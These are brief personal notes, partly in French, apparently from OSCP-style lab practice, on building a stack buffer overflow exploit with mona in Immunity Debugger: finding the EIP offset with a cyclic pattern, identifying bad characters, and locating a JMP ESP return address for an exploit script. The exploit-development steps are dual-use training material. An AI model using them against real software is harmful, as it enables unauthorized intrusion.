# MONA

## add to path in immunitydbg

!mona config -set workingfolder c:\mona\%p


## generate pattern and find EIP addr
(Fuzzing crashed at 2000 bytes)
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2400
!mona findmsp -distance 2400

EIP contains normal pattern : 0x6f43396e (offset 1978)

## test des bads char:
(ESP à l'adresse  0199FA30)
!mona bytearray -b "\x00"
!mona compare -f C:\mona\oscp\bytearray.bin -a 0199FA30

on rajoute 00 au bad chars
00 07 08 2e 2f a0 a1 
"\x00\x07\x08\x2e\x2f\xa0\xa1"
mais attention les bytes qui se suivent ne sont probablement pas des badchars, il nous reste donc:
\x00\x07\x2e\xa0


## trouver un jmp esp
!mona jmp -r esp -cpb "\x00\x07\x08\x2e\x2f\xa0\xa1"

réponse:
625011af

dans exploit.py
retn = "\xaf\x11\x50\x62"

